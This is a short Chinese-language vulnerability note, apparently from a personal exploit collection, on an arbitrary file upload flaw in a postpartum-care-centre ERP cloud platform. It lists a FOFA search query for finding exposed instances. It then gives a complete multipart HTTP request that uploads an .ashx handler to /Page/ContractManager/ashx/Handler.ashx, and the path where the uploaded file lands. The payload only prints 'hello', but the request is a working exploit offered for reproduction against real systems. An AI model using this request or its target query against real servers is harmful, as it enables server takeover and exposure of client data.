# 月子会所ERP管理云平台ContractManager任意文件上传漏洞

# <font style="color:#080808;background-color:#ffffff;">一、漏洞简介</font>
<font style="color:#080808;background-color:#ffffff;">月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。由于未对上传文件进行任何过滤，可上传任意文件，攻击者可利用该漏洞获取服务器控制权。</font>

# <font style="color:#080808;background-color:#ffffff;">二、影响版本</font>
+ <font style="color:#080808;background-color:#ffffff;">月子会所ERP管理云平台</font>

# <font style="color:#080808;background-color:#ffffff;">三、资产测绘</font>
+ fofa`product="妈妈宝盒-ERP"`
+ 登录页面

![1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab.png](./img/7hQQxOj6AIZDFquH/1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab-561053.png)

# <font style="color:#080808;background-color:#ffffff;">四、漏洞复现</font> 
```plain
POST /Page/ContractManager/ashx/Handler.ashx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_301
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 497
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.ashx"

<% @ webhandler language="C#" class="AverageHandler" %> 
using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
    public bool IsReusable 
    { 
        get {
             return true; 
            } 
        } 
        public void ProcessRequest(HttpContext ctx) 
        { 
            ctx.Response.Write("hello"); 
        } 
    }
--00content0boundary00--

```

![1695622326192-8b9da39e-f216-43be-8d60-6a6b927234c0.png](./img/7hQQxOj6AIZDFquH/1695622326192-8b9da39e-f216-43be-8d60-6a6b927234c0-780900.png)

根据回显拼接上传文件位置

```plain
/UploadBaseFolder/Contact/1_2309251411214592641.ashx
```

![1695622362200-90a32f07-4c87-41bf-aee8-0885c6181e44.png](./img/7hQQxOj6AIZDFquH/1695622362200-90a32f07-4c87-41bf-aee8-0885c6181e44-189522.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/etvvzb1rdaqrt08g>